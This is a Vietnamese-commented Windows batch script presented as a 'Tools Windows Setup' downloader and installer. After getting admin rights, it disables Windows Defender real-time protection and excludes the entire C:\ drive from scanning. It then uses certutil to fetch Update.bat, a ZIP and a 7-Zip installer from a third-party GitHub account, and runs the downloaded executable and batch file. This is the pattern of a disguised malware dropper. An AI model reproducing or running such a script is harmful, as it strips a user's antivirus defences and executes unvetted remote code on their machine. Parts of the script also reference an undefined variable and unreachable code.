@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: ========================
:: Đặt console ~600x400 (80x25 ký tự)
:: ========================
mode con cols=80 lines=25

:: Căn giữa màn hình bằng WinAPI qua PowerShell (đÃ sửa $h=$r.Bottom-$r.Top)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool GetWindowRect(IntPtr hWnd,out RECT lpRect);[DllImport(\"user32.dll\")]public static extern bool MoveWindow(IntPtr hWnd,int X,int Y,int W,int H,bool Repaint);public struct RECT{public int Left;public int Top;public int Right;public int Bottom;}' -Name Win32 -Namespace Native; Add-Type -AssemblyName System.Windows.Forms; $hWnd=[Native.Win32]::GetConsoleWindow(); $r=New-Object Native.Win32+RECT; [Native.Win32]::GetWindowRect($hWnd,[ref]$r) | Out-Null; $w=[int]($r.Right-$r.Left); $h=[int]($r.Bottom-$r.Top); $sw=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $sh=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $x=[int](($sw-$w)/2); $y=[int](($sh-$h)/2); [Native.Win32]::MoveWindow($hWnd,$x,$y,$w,$h,$true)"

title Tat tam thoi Windows Defender + Tai file GitHub + Giai nen ZIP
color 0A

REM =============== KIỂM TRA INTERNET (ping 8.8.8.8) ===============
set "_tries=0"
:CHECK_INTERNET
ping 8.8.8.8 -n 1 -w 2500 >nul 2>&1 && goto NET_OK
set /a _tries+=1
if %_tries% GEQ 3 echo [!] Khong co Internet. Thoat.& exit /b 1
echo [!] Khong ping duoc 8.8.8.8. Thu lai sau 5s (lan %_tries%/3)...
timeout /t 5 /nobreak >nul
goto CHECK_INTERNET
:NET_OK
echo [+] Da co ket noi Internet.
echo.


:: ========================
:: KIỂM TRA QUYỀN ADMIN
:: ========================
net session >nul 2>&1
if %errorlevel%==0 goto :ADMIN

powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; $msg='File nay can chay bang quyen Administrator. Ban co muon khoi dong lai voi quyen Admin khong?'; if ([System.Windows.Forms.MessageBox]::Show($msg,'Yeu cau quyen Admin','OKCancel','Warning') -eq 'OK') {Start-Process -FilePath '%~f0' -Verb RunAs}"
exit /b

:ADMIN
echo Dang chay voi quyen Admin.
echo.

:: ========================
:: TẮT TẠM THỜI DEFENDER (Win10+; Win7/8 try/catch)
:: ========================
echo Dang tat tam thoi Windows Defender Real-Time Protection...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\' } catch {}"
echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc).
echo.

:: ========================
:: KHAI BÁO ĐƯỜNG DẪN / URL
:: ========================
set "DESKTOP=%USERPROFILE%\Desktop"
set "TARGETDIR=%DESKTOP%\Tools Windows Setup"
set "FILE1=%TEMP%\Update.bat"
set "FILE2=%TARGETDIR%\Tools_Windows_Setup.zip"
set "FILE3=%TARGETDIR%\Tools_Windows_Setup.exe"
set "EXE_7z_x64=%TEMP%\7z2301-x64.exe"
set "EXE_7z_x32=%TEMP%\7z2301.exe"

set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Update.bat"
set "URL_ZIP=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.zip"
set "URL_EXE_7z_x64=https://www.7-zip.org/a/7z2301-x64.exe"
set "URL_EXE_7z_x32=https://www.7-zip.org/a/7z2301.exe"

if not exist "%TARGETDIR%" (
  echo Tao thu muc: "%TARGETDIR%"
  mkdir "%TARGETDIR%" 2>nul
)

:: Xoá file cũ nếu tồn tại
if exist "%FILE1%" (echo [i] Xoa file cu: Update.bat & del /f /q "%FILE1%")
if exist "%FILE2%" (echo [i] Xoa file cu: Tools_Windows_Setup.zip & del /f /q "%FILE2%")
if exist "%FILE3%" (echo [i] Xoa file cu: Tools_Windows_Setup.exe & del /f /q "%FILE3%")

:: ========================
:: TẢI FILE (WebClient + TLS1.2)
:: ========================

REM =============== TẢI Update.bat ===============
echo Dang tai Update.bat ...
certutil -urlcache -split -f "%URL_BAT%" "%FILE1%" >nul 2>&1
if exist "%FILE1%" goto DL1_OK
echo [-] Loi tai Update.bat
goto END
:DL1_OK

REM =============== TẢI ZIP vào STAGING ===============
echo Dang tai Tools_Windows_Setup.zip ...
certutil -urlcache -split -f "%URL_ZIP%" "%FILE2%" >nul 2>&1
if exist "%FILE2%" goto DL2_OK
echo [-] Loi tai Tools_Windows_Setup.zip
goto END
:DL2_OK

echo.

REM =============== ƯU TIÊN 7-ZIP ===============
call :ENSURE_7ZIP
if not defined _7ZEXE (
  echo [!] Khong cai/khong tim duoc 7-Zip. Dung fallback giai nen khac...
)

echo Dang giai nen bang 7-Zip: "%FILE2%"  ->  "%TARGETDIR%"
call :UNZIP_WITH_7Z "%FILE2%" "%TARGETDIR%" && goto UNZIP_DONE

echo [!] Desktop co the bi chan. Thu giai nen vao: "%ALT_TARGET%"
if not exist "%ALT_TARGET%" mkdir "%ALT_TARGET%" >nul 2>&1
icacls "%ALT_TARGET%" /inheritance:e /grant "%USERNAME%":(OI)(CI)F /T /Q >nul 2>&1
call :UNZIP_WITH_7Z "%FILE2%" "%ALT_TARGET%" && (set "TARGETDIR=%ALT_TARGET%" & goto UNZIP_DONE)


:UNZIP_DONE
echo .....................................
echo Dang tien hanh giai nen . . .
echo .....................................
echo Giai nen thanh cong vao: "%TARGETDIR%"
timeout /t 5 /nobreak >nul
start "" "%FILE3%"
start "" "%FILE1%"
echo.


:END
echo.
echo Hoan tat.
endlocal
exit /b


REM ======================= HÀM: ĐẢM BẢO 7-ZIP (TẢI 5 BƯỚC) ==========================
:ENSURE_7ZIP
set "_7ZEXE="
call :FIND_7Z
if defined _7ZEXE exit /b 0

echo Dang cai 7-Zip (tu nhan x64/x86)...
REM Xac dinh kieu OS
set "_ARCH=x86"
if defined ProgramFiles(x86) set "_ARCH=x64"

REM === Links 7-Zip dùng GitHub Releases của bạn ===
set "URL_7Z_X86=https://github.com/ToolsSetupWindows/ToolsSetupWindows/releases/download/7-Zip/7z2501-x86.exe"
set "URL_7Z_X64=https://github.com/ToolsSetupWindows/ToolsSetupWindows/releases/download/7-Zip/7z2501-x64.exe"
if /i "%_ARCH%"=="x64" (set "URL_7Z=%URL_7Z_X64%") else (set "URL_7Z=%URL_7Z_X86%")

set "_7ZSETUP=%TEMP%\_7z_setup.exe"
if exist "%_7ZSETUP%" del /f /q "%_7ZSETUP%" >nul 2>&1

echo Dang tai bo cai 7-Zip ...
REM === 1) certutil
certutil -urlcache -split -f "%URL_7Z%" "%_7ZSETUP%" >nul 2>&1
if not exist "%_7ZSETUP%" (
  echo [-] Loi tai bo cai 7-Zip
  exit /b 1
)


:DL7Z_OK
echo Dang cai dat 7-Zip silent...
start "" /wait "%_7ZSETUP%" /S
ping 127.0.0.1 -n 2 >nul

call :FIND_7Z
if defined _7ZEXE (
  echo [+] Da tim thay 7-Zip: "%_7ZEXE%"
  exit /b 0
) else (
  echo [-] Cai 7-Zip co ve that bai.
  exit /b 1
)

REM ======================= HÀM: TÌM 7Z.EXE ==========================
:FIND_7Z
for %%I in ("%ProgramFiles%\7-Zip\7z.exe") do if exist "%%~fI" set "_7ZEXE=%%~fI"
if not defined _7ZEXE for %%I in ("%ProgramFiles(x86)%\7-Zip\7z.exe") do if exist "%%~fI" set "_7ZEXE=%%~fI"
if not defined _7ZEXE for %%I in ("%LOCALAPPDATA%\Programs\7-Zip\7z.exe") do if exist "%%~fI" set "_7ZEXE=%%~fI"
if not defined _7ZEXE for %%G in (7z.exe) do if not "%%~$PATH:G"=="" set "_7ZEXE=%%~$PATH:G"
exit /b 0

REM ======================= HÀM: GIẢI NÉN BẰNG 7-ZIP ==================
:UNZIP_WITH_7Z
REM %1 = ZIP file, %2 = OUTDIR
set "_ZIP=%~1"
set "_OUT=%~2"
if not exist "%_OUT%" mkdir "%_OUT%" >nul 2>&1
attrib -r -s -h "%_OUT%\*" /s /d >nul 2>&1
"%_7ZEXE%" x -y -aoa -bso0 -bsp1 -bb0 -o"%_OUT%" "%_ZIP%"
if errorlevel 1 exit /b 1
exit /b 0

goto :OPEN_UPDATE

:FOUND_EXE_LABEL
echo [*] Mo: "%FOUND_EXE%"
start "" "%FOUND_EXE%"

:OPEN_UPDATE
if exist "%FILE1%" (
  echo [*] Mo: "%FILE1%"
  start "" "%FILE1%"
)

:END
echo.
echo Hoan tat.
endlocal
exit
